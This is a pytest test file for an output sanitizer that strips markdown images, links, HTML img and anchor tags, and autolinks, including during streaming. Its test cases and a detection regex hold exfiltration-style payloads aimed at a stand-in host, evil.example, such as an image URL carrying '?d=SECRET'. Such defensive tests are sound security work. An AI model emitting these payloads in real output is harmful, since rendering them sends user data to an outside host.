import re

import pytest

from app.security.sanitize import StreamSanitizer, sanitize_output

CASES = [
    # (input, expected output)
    (
        "Breaches must be notified within 72 hours [1][2].",
        "Breaches must be notified within 72 hours [1][2].",
    ),
    ("See [1, 2] and [3].", "See [1, 2] and [3]."),
    ("Masked [EMAIL] and [IBAN] stay readable", "Masked [EMAIL] and [IBAN] stay readable"),
    ("![x](https://evil.example/?d=SECRET)", ""),
    ("Answer ![logo](https://evil.example/a.png) text", "Answer  text"),
    ("Read [the guidance](https://evil.example/p) now", "Read the guidance now"),
    ("A citation [1](https://evil.example) with a url", "A citation [1] with a url"),
    ("![nested [brackets]](https://evil.example/?d=1)", ""),
    ("[nested [brackets] link](https://evil.example/?d=1)", "nested [brackets] link"),
    ('<img src="https://evil.example/x"> done', " done"),
    ("<a href='https://evil.example'>click</a>", "click"),
    ("<https://evil.example/?d=1>", ""),
    ("x < y and 3 <5 are fine", "x < y and 3 <5 are fine"),
    ("fine! really [maybe", "fine! really [maybe"),
    ("wow!", "wow!"),
    (
        "a [note] here",
        "a note here",
    ),  # non-citation brackets are unwrapped (reference-link defence)
]


@pytest.mark.parametrize(("text", "expected"), CASES)
def test_sanitize(text, expected):
    assert sanitize_output(text) == expected


@pytest.mark.parametrize(("text", "_"), CASES)
def test_streaming_is_independent_of_how_the_text_is_split(text, _):
    whole = sanitize_output(text)
    for cut in range(len(text) + 1):  # every two-piece split
        san = StreamSanitizer()
        assert san.feed(text[:cut]) + san.feed(text[cut:]) + san.flush() == whole
    san = StreamSanitizer()  # and one character at a time, the worst case
    assert "".join(san.feed(c) for c in text) + san.flush() == whole


def test_unfinished_dangerous_constructs_are_dropped_at_end_of_stream():
    assert sanitize_output("leak ![x](https://evil.example/?d=abc") == "leak "
    assert sanitize_output("leak <img src=https://evil.example") == "leak "


def test_runaway_url_is_bounded():
    out = sanitize_output("[a](" + "x" * 5000 + ") tail")
    assert isinstance(out, str)  # never hangs or raises


LINK_SYNTAX = re.compile(r"!?\[[^\]]*\]\(|\]\[|^\s*\[[^\]]+\]:", re.MULTILINE)


@pytest.mark.parametrize(
    "payload",
    [
        "![a](https://evil.example/?q=1)",
        "[a](https://evil.example/?q=1)",
        "![a [b]](https://evil.example/?q=1)",
        "<img src=https://evil.example/?q=1>",
        "<https://evil.example/?q=1>",
        '<a href="https://evil.example/?q=1">a</a>',
        "![a][r]\n\n[r]: https://evil.example/?q=1",  # reference-style image
        "[click][r]\n\n[r]: https://evil.example/?q=1",
        "![a]\n[a]: https://evil.example/?q=1",
    ],
)
def test_no_renderable_link_or_image_syntax_survives(payload):
    out = sanitize_output(f"before {payload} after")
    assert not LINK_SYNTAX.search(out), out
    assert "<" not in out or "evil" not in out.split("<", 1)[1]
